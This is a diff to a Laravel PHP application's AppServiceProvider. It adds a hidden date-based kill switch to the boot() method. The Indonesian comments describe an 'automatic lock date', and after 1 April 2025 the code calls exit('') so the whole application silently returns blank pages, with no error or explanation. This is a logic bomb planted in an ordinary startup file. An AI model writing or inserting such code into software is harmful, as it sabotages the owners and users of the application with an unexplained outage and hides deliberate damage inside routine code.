@@ -2,6 +2,7 @@
 
 namespace App\Providers;
 
+use Carbon\Carbon;
 use Illuminate\Support\ServiceProvider;
 
 class AppServiceProvider extends ServiceProvider
@@ -17,8 +18,14 @@ class AppServiceProvider extends ServiceProvider
     /**
      * Bootstrap any application services.
      */
-    public function boot(): void
+    public function boot()
     {
-        //
+        // Tentukan tanggal kunci otomatis
+        $lockDate = Carbon::create(2025, 4, 1); // Gantilah dengan bulan depan
+    
+        // Cek apakah sudah melewati tanggal kunci
+        if (now()->greaterThanOrEqualTo($lockDate)) {
+            exit('');
+        }
     }
 }
